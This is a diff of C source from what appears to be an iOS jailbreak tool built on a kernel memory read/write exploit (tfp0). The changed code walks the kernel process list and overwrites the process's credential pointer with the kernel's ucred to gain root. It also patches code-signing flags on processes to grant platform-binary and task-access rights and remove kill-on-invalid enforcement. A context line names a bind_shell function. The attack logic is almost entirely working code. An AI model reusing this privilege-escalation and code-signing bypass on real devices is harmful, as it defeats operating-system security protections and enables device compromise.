@@ -835,72 +835,26 @@ void bind_shell(char* env_path, int port) {
 // proc_for_pid based on cheesecakeufo code
 // by stek29: https://gist.github.com/stek29/8b808986e7ee3c204bfb76d69577812f
 
+// find bsd_info from our own task_self_addr
 uint64_t proc_for_pid(uint32_t pid) {
     uint64_t task_self = task_self_addr();
     uint64_t struct_task = rk64(task_self + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
-    uint64_t next_task = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_NEXT));
     
-    while (struct_task != 0 && ((struct_task & 0xffff000000000000) == 0xffff000000000000) ) {
+    while (struct_task != 0) {
         uint64_t bsd_info = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
-        uint32_t found = rk32(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID));
+        uint32_t fpid = rk32(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID));
         
-        if (found == pid) {
+        if (fpid == pid) {
             return bsd_info;
         }
-        
         struct_task = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_PREV));
     }
-    
-    struct_task = next_task;
-    while (struct_task != 0 && ((struct_task & 0xffff000000000000) == 0xffff000000000000) ) {
-        uint64_t bsd_info = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
-        uint32_t found = rk32(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID));
-        
-        if (found == pid) {
-            return bsd_info;
-        }
-        
-        struct_task = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_NEXT));
-    }
-    
-    return -1;
+    printf("unable to find bsd_info for given pid ...\n");
+    sleep(10);
+    exit(EXIT_FAILURE);
 }
 
-
-uid_t get_root () {
-    
-    uid_t old = getuid();
-    
-    uint64_t our_proc = proc_for_pid(getpid());
-    printf("our proc: %llx\n", our_proc);
-    uint64_t kernel_proc = proc_for_pid(0);
-    printf("krn proc: %llx\n", kernel_proc);
-    
-    if(our_proc == -1 || kernel_proc == -1) {
-        printf("[ERROR]: no our/krn proc. wut\n");
-        return getuid();
-    }
-    
-    uint64_t krn_ucred = rk64(kernel_proc + 0x100 /* KSTRUCT_OFFSET_PROC_UCRED */);
-    printf("krn_ucred: %llx\n", krn_ucred);
-    uint64_t our_ucred = rk64(our_proc + 0x100 /* KSTRUCT_OFFSET_PROC_UCRED */);
-    printf("our_ucred: %llx\n", our_ucred);
-    
-    wk64(our_proc + 0x100 /* KSTRUCT_OFFSET_PROC_UCRED */, krn_ucred);
-    printf("[INFO]: successfully wrote our kern_ucred into our cred!\n");
-    setuid(0);
-    printf("[INFO]: new uid: %d\n", getuid());
-    FILE *f = fopen("/var/mobile/test.txt", "w");
-    if(f == 0){
-        printf("[INFO]: failed to write test file");
-    }else{
-        printf("[INFO]: wrote test file: %p\n", f);
-    }
-    
-    return old;
-}
-
-mach_port_t go() {
+void go() {
   mach_port_t tfp0 = get_kernel_memory_rw();
   printf("tfp0: %x\n", tfp0);
     
@@ -915,10 +869,27 @@ mach_port_t go() {
      
      */
 
-    uid_t old = get_root();
+    uint64_t bsd_task=proc_for_pid(getpid());
+    uint64_t cred = rk64(bsd_task+0x100);
+      
+    uint64_t credpatch = 0;
+    uint64_t proc = bsd_task;
+    while (proc) {
+      uint32_t pid = rk32(proc+0x10);
+      uint32_t csflags = rk32(proc+0x2a8);
+      csflags |= CS_PLATFORM_BINARY|CS_INSTALLER|CS_GET_TASK_ALLOW;
+      csflags &= ~(CS_RESTRICT|CS_KILL|CS_HARD);
+      wk32(proc+0x2a8, csflags);
+      if (pid == 0) {
+          credpatch = rk64(proc+0x100);
+          break;
+      }
+      proc = rk64(proc);
+    }
+    uint64_t orig_cred = cred;
+    wk64(bsd_task+0x100, credpatch);
+    printf("[INFO]: new uid: %d\n", getuid());
     // do root stuff below
-    
-    
     
     /*
      To change your resolution:
@@ -934,32 +905,25 @@ mach_port_t go() {
         
         char ch;
         FILE *source, *target;
-        
         char* path;
-        
         asprintf(&path, "%s/com.apple.iokit.IOMobileGraphicsFamily.plist", bundle_path());
-        
         source = fopen(path, "r");
-        
         target = fopen("/var/mobile/Library/Preferences/com.apple.iokit.IOMobileGraphicsFamily.plist", "w");
         
         while( ( ch = fgetc(source) ) != EOF )
             fputc(ch, target);
         
         printf("Resolution changed, please reboot.\n");
-        
         fclose(source);
         fclose(target);
-        
     }
 
     //set uid back
-    setuid(old);
+    wk64(bsd_task+0x100, orig_cred);
+    sleep(2);
     
     if (probably_have_correct_symbols()) {
         printf("have symbols for this device, testing the kernel debugger...\n");
         test_kdbg();
     }
-    
-    return tfp0;
 }
